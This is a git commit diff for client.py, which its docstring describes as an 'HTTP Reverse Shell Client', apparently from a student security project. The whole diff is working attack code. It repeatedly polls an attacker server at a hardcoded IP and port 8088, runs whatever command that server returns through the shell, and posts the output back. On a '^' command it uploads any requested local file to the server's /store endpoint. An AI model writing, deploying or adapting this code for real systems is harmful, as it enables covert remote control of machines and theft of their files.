af6aa1463bd70f34b578c788d9ca3d19659bdf03
Jordan Sosnowski <jjs0029@auburn.edu>
2019-11-01 19:40:25 -0500

    Updated client
    added comments and functions

--- client.py
+++ client.py
@@ -1,38 +1,95 @@
+#!/usr/bin/env python3
+
 import http.client
 import subprocess
 import time
 import requests
 import os
-IP = 'http://' + 'localhost' + ':8088'
+IP = 'http://' + '192.168.1.159' + ':8088'
 
-while True:
+"""
+Authors: Jordan Sosnowski and John Osho
+Date: November 1, 2019
 
-    # Setup connection to attacker
-    req = requests.get(IP)      # Send GET request to host machine
-    command = req.text
+HTTP Reverse Shell Client
+"""
 
-    if command in {'terminate', 't'}:
-        print("Terminating Connection")
-        break
 
-    elif 'grab' in command:
-        grab, path = command.split('*')
+def send_file(command):
+    """
+    Sends requested file back to server 
 
-        if os.path.exists(path):
-            url = IP + '/store'  # Append /store in the URL
-            # Add a dictionary key where file will be stored
-            files = {'file': open(path, 'rb')}
-            r = requests.post(url, files=files)  # Send the file
-            # requests library use POST method called "multipart/form-data"
-        else:
-            post_response = requests.post(
-                url=IP, data='[-] Not able to find the file !')
+    args:
+        command (str): string containing path to file
+        to send to server
+
+        uses format `^ file_path`
+
+    """
+    _, path = command.split()
+    print(f"Pulling file: {path}")
+
+    if os.path.exists(path):
+        url = IP + '/store'  # Append /store in the URL
+        # Add a dictionary key where file will be stored
+        files = {'file': open(path, 'rb')}
+        r = requests.post(url, files=files)  # Send the file
+        # requests library use POST method called "multipart/form-data"
     else:
-        print(f"Additional command {command}")
-        CMD = subprocess.run(command, capture_output=True, shell=True)
         post_response = requests.post(
-            url=IP, data=CMD.stdout.decode())
+            url=IP, data='[-] Not able to find the file !')
+
+
+def pull_registry():
+    pass
+
+
+def run_process(command):
+    """
+    Runs local process on machine
+
+    args:
+        command (str): command to run on machine
+
+        i.e. ls, dir, cat /etc/hosts
+    """
+
+    print(f"Running command: {command}")
+
+    # ouptut needs to be captures as we are sending the std out and error back
+    cmd = subprocess.run(command, capture_output=True, shell=True)
+
+    # only send out and err if they exist, limits post requests back to server
+    out = cmd.stdout.decode()
+    err = cmd.stderr.decode()
+    if out:
         post_response = requests.post(
-            url=IP, data=CMD.stderr.decode())
-    print(f"Status Code: {req.status_code}")
-    time.sleep(3)
+            url=IP, data=out)
+    if err:
+        post_response = requests.post(
+            url=IP, data=err)
+
+
+def main():
+    while True:
+
+        # Setup connection to attacker
+        # Send GET request to host machine
+        req = requests.get(IP)
+        command = req.text
+
+        if command in {'terminate', 't'}:
+            print("Terminating Connection")
+            break
+        elif '!' in command:
+            pull_registry()
+        elif '^' in command:
+            send_file(command)
+        else:
+            run_process(command)
+        print(f"Status Code: {req.status_code}")
+        time.sleep(2)
+
+
+if __name__ == "__main__":
+    main()
